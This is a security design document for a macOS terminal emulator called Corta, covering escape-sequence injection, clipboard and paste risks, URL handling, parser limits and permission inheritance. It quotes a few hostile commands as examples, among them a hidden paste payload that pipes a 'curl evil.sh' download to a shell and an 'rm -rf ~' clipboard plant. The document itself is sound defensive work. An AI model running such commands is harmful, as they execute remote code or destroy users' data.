# Corta — Security Model

A terminal emulator is a program that renders **untrusted input with
full user privileges**. Every byte it parses may come from a hostile
source: a crafted filename, a malicious repository's `git log`, the
output of `curl`, a compromised remote host over SSH.

This document is a design constraint, not a checklist for later. Several
of its conclusions are "do not implement X" — those belong in the design
before the code exists.

---

## 1. Threat Model

**Assumed hostile:** all bytes arriving from the PTY. The user did not
choose them and frequently cannot see them.

**Assumed trusted:** the local user, the config file, and the shell they
chose to run.

**Explicitly out of scope:** an attacker who already executes code as the
user. A terminal cannot defend against that, and pretending otherwise
adds complexity without safety.

**The core risk is inversion of control.** Terminal escape sequences let
output influence the terminal's state — and, through query responses and
the clipboard, influence *input*. Anywhere output can become input is
where the real vulnerabilities are.

---

## 2. Escape Sequence Injection

### 2.1 The general rule

> Any sequence that causes the terminal to **write to the child's
> stdin** is a potential command injection. Responses must be
> fixed-format and must never contain attacker-supplied text.

Query/response sequences are required for correctness
(`CONFORMANCE.md` §1.2) — DA1, DA2 and DSR-CPR are P0. They are safe
because their responses are constants or numeric cursor coordinates. The
danger begins the moment a response carries back a string that the
stream itself supplied.

### 2.2 Never implement title reporting

Setting the window title (OSC 0 / 2) is safe and expected. **Reading it
back (`ESC [ 21 t`) is not, and Corta will not implement it.**

The attack is well known: hostile output sets the title to arbitrary
text, then asks the terminal to report it. The reply is injected into the
shell's stdin as if typed. With a newline in the payload, this is
arbitrary command execution from merely `cat`-ing a file.

The same reasoning applies to any future sequence that echoes stored
state back to the child. This is listed as a non-goal in `DESIGN.md` §6.

### 2.3 Bracketed paste is a security feature

`?2004` is classified P0 in `CONFORMANCE.md`, not P1, for this reason:
without it, pasting text containing a newline executes it immediately.
Copying a command from a web page where a hidden element appended
`\ncurl evil.sh | sh\n` is a real and repeatedly exploited attack.

- Bracketed paste is enabled by default.
- When a paste contains a newline **and** the application has not enabled
  bracketed paste mode, warn before sending.
- Strip `ESC` and other C0 control characters from pasted text — a paste
  is data, never a command stream.

### 2.4 URLs and hyperlinks

⌘-clicking a URL launches another application. Treat the target as
hostile input:

- **Allowlist schemes**: `http`, `https`, `mailto`. Nothing else. A
  `file://` or custom-scheme URL can invoke an arbitrary registered
  handler.
- **Show the real target** before opening. This is mandatory for OSC 8
  hyperlinks, where display text and destination differ *by design* —
  that is phishing as a protocol feature.
- **Never auto-open** anything. Opening is always an explicit user
  action.

**As implemented (M4.6, M6.8).** The detector's pattern can only match
the three allowlisted schemes, so a `file://` string in terminal output
is plain text; the scheme is then re-checked at the hand-off to
`NSWorkspace`, because that is the line between terminal output and
another application launching. An explicit OSC 8 hyperlink wins over
pattern detection — the program said what the target is — and the ⌘-hover
tooltip names *that* target, not the text under the pointer, which is the
only thing that makes the "show the real target" rule mean anything.

### 2.4.1 Text sent to the shell

Dropping a file on a pane types its path at the prompt (M6.15). A
filename is attacker-influenceable and can contain `;`, backticks or
`$(…)`, so the path is POSIX single-quoted before it is sent: an
unquoted drop of a maliciously named file would be a command waiting for
a Return. The same path handles text returned by a Services item.

This does not contradict §2.1. That rule forbids writing *stream-supplied*
text back to the child — output the terminal received. A dropped path is
a user action naming a file the user chose, which is what typing is.

### 2.5 Bidirectional and invisible characters

Corta does not implement RTL/bidi (`DESIGN.md` §6), which removes the
"Trojan Source" class of attack where U+202E visually reorders text so
that what is displayed differs from what is executed.

The remaining requirement: **do not render bidi and other invisible
control characters as nothing.** Draw them as a visible replacement
glyph. Invisible-by-default is what makes the attack work.

### 2.6 OSC 52 clipboard

Useful — it is how copying from Neovim on a remote host reaches the local
clipboard — and genuinely dangerous.

- **Write** (remote sets the local clipboard): off by default. Any output
  could place `rm -rf ~` or an attacker's wallet address into the
  clipboard for the user to paste later. Enable via config, and consider
  a notification when it fires.
- **Read** (remote queries the local clipboard): **never implemented.**
  It exfiltrates whatever the user last copied — passwords, tokens — to
  any host that can print bytes. There is no configuration for this; it
  is simply absent.

---

## 3. Resource Exhaustion

The parser must survive adversarial input without crashing, hanging, or
allocating without bound. These caps are asserted in the fuzz harness
(`CONFORMANCE.md` §4.3) and are also memory requirements
(`PERFORMANCE.md` §4).

| Input                      | Cap                                                   |
| -------------------------- | ----------------------------------------------------- |
| OSC / DCS string length    | Hard limit; discard the sequence on overflow and resynchronise |
| CSI parameter count        | 16 (xterm's limit); ignore the remainder               |
| CSI parameter value        | Clamp to a sane maximum before use                     |
| Repeat counts (e.g. `REP`) | Clamp to the screen or scrollback dimension            |
| Scrollback                 | Configured line cap, enforced by the ring buffer       |
| Glyph atlas                | Bounded with eviction                                  |

An unterminated OSC string is the canonical case: a stream that opens one
and never closes it must not accumulate gigabytes in a buffer.

Unknown sequences must be **safely ignored**. Because `$TERM` announces
`xterm-256color` (`DESIGN.md` §2.5), programs will send sequences Corta
does not implement. Skipping them cleanly is a correctness requirement
and a robustness one.

---

## 4. Process and Platform

### 4.1 The App Sandbox is disabled, deliberately

`ENABLE_APP_SANDBOX = NO`. A terminal must spawn arbitrary processes with
the user's full privileges; that is its entire purpose, and it is
incompatible with the sandbox. iTerm2 and Ghostty are likewise
unsandboxed. Consequences, accepted:

- Distribution via the Mac App Store is not possible.
- `ENABLE_HARDENED_RUNTIME = YES` stays on, and notarization is required
  for distribution outside the App Store.

### 4.2 Child processes inherit the terminal's TCC permissions

This is the most underappreciated risk in the entire design, and it is
worth stating plainly:

> If Corta is granted Full Disk Access, Camera, Microphone, or Contacts
> permission, **every program run inside it inherits that grant.**

A single `curl … | sh` inside a terminal with Full Disk Access has Full
Disk Access. Therefore:

- Corta requests **no** TCC permission it does not itself need.
- Documentation must warn users about granting Full Disk Access to a
  terminal, rather than recommending it to silence a prompt.

### 4.3 Spawning children safely

`DESIGN.md` §7.2 covers the correctness hazard (the Swift runtime is not
async-signal-safe between `fork` and `exec`). The security requirements
alongside it:

- Reset the signal mask and dispositions in the child.
- Close all inherited descriptors except the PTY replica.
- Establish a new session and controlling terminal (`POSIX_SPAWN_SETSID`
  / `TIOCSCTTY`) so job control and signals are correctly scoped.
- Sanitise the environment; do not leak internal variables to the child.

### 4.4 Child lifecycle

On window or tab close, send `SIGHUP` to the child's **process group**,
not just the direct child. Leaking orphaned process groups is both a
resource leak and a surprise for the user, who reasonably believes
closing a window stopped what was in it.

---

## 5. Data at Rest

**Scrollback is never persisted to disk.** It routinely contains
credentials — `export API_KEY=…`, connection strings, tokens echoed by a
tool that should not have echoed them.

macOS state restoration is a specific case:
`applicationSupportsSecureRestorableState` returns `true`, but restored
state must contain **window geometry only**. Terminal contents are never
written to the restoration store.

Terminal windows now set `isRestorable = false` outright. Nothing about a
terminal window is restorable — its content is a live child process, not
a document — so there is no geometry worth saving either, and the one
thing restoration actually did was re-apply a stale frame *after* the
deliberate sizing. Off is both the correct behaviour and one fewer store
that could ever hold something it should not.

**Notifications carry no terminal content.** The long-task notification
(M6.3) reports a duration and the window title, never the command or any
output: Notification Center is a second store, outside the app, with its
own retention — and the grid is full of things that must not go there.

**The config file holds settings only** (M6.1). It is a plain text file
at `~/.config/corta/config` with no credential-shaped field, and nothing
from the terminal stream is ever written into it.

If session persistence is ever added, it is opt-in, documented as storing
plaintext, and off by default.

### Secure keyboard entry

Consider exposing `EnableSecureEventInput` (as iTerm2 does). It prevents
other processes from observing keystrokes while the terminal has focus,
which matters when typing passwords at a `sudo` or SSH prompt. It has a
system-wide cost, so it is a user-facing option rather than a default.

---

## 6. Rules Summary

For quick reference during implementation and review:

1. Every byte from the PTY is hostile.
2. Never write attacker-supplied text back to the child's stdin.
3. Title query, OSC 52 read: not implemented, by design, not by omission.
4. Bracketed paste on by default; strip control characters from pastes.
5. URL schemes are allowlisted; nothing opens without a user action.
6. Every parser input has an explicit cap; unknown sequences are ignored
   cleanly.
7. Request no TCC permission Corta does not itself need.
8. Scrollback never touches the disk.
